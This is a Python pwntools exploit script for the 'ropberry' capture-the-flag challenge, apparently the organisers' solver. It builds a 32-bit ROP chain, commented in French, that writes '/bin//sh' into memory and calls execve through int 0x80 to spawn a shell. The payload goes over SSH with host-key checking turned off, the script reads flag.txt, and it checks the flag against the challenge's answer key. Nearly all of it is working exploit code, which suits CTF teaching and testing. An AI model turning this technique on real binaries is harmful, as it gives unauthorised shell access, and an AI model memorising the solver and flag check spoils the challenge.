from pwn import *
from struct import pack
import os
import subprocess

if os.getenv("DEV") == "1":
    host = "localhost"
else:
    host = "ropberry.ctf.insecurity-insa.fr"
keyfile = "keys/id_rsa"

# Vuln ret adress: 0x8048f1e

popedx = 0x0805957a
popeax = 0x080c1906
movdword = 0x0808e22d
xoreax = 0x0804aef0
popebx = 0x080481ec
popecx = 0x080e394a
inceax = 0x08099a2f
int80 = 0x08059d6f
addrdata = 0x080ee060

p = b"A"*8

p += pack('<I', popedx) 	# pop edx ; ret
p += pack('<I', addrdata) 	# Dans edx, nous mettons l'adresse du debut de .data

p += pack('<I', popeax) 	# pop eax ; ret
p += b'/bin'			# Dans eax, nous mettons la chaine de caracteres "/bin"

p += pack('<I', movdword) 	# mov dword ptr [edx], eax ; ret | Ce qui permet d'ecrire "/bin" dans .data

p += pack('<I', popedx) 	# pop edx ; ret
p += pack('<I', addrdata + 4) 	# Dans edx, nous mettons l'adresse de .data + 4 pour prevoir "//sh"

p += pack('<I', popeax) 	# pop eax ; ret
p += b'//sh'						# Nous mettons "//sh" dans eax

p += pack('<I', movdword) 	# mov dword ptr [edx], eax ; ret | Et nous ecrivons "//sh" juste apres "/bin"

p += pack('<I', popedx) 	# pop edx ; ret
p += pack('<I', addrdata + 8) 	# Dans edx, nous mettons l'adresse de .data + 8, donc apres la chaine de caracteres "/bin//sh"

p += pack('<I', xoreax) 	# xor eax, eax ; ret

p += pack('<I', movdword) 	# mov dword ptr [edx], eax ; ret | Et on s'assure que cet emplacement contient des 0x00 pour terminer la chaine de caracteres

p += pack('<I', popebx) 	# pop ebx ; ret
p += pack('<I', addrdata) 	# Dans ebx, nous mettons l'adresse du debut de .data, qui contient "/bin//sh" suivi de null bytes

p += pack('<I', popecx) 	# pop ecx ; ret
p += pack('<I', 0x00000000) 	# On met ecx a 0

p += pack('<I', popedx) 	# pop edx ; ret
p += pack('<I', 0x00000000) 	# On met edx a 0

p += pack('<I', xoreax) 	# xor eax, eax ; ret

for i in range(11):		# Afin d'avoir eax = 11, on boucle 11 fois
    p += pack('<I', inceax)     # inc eax ; ret

p += pack('<I', int80)          # int 0x80

with open("/tmp/exp.exp", "wb") as f:
    f.write(p)


out = subprocess.check_output([f"(cat /tmp/exp.exp ; sleep 5;echo 'cat flag.txt';sleep 1;echo 'cat flag.txt') | ssh -oStrictHostKeyChecking=no -p 2226 -i keys/id_rsa user@{host}"], shell=True).decode()
flag = out.split("\n")[-2]

print("FLAG found =", flag)

import re
actual_flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
assert actual_flag in flag
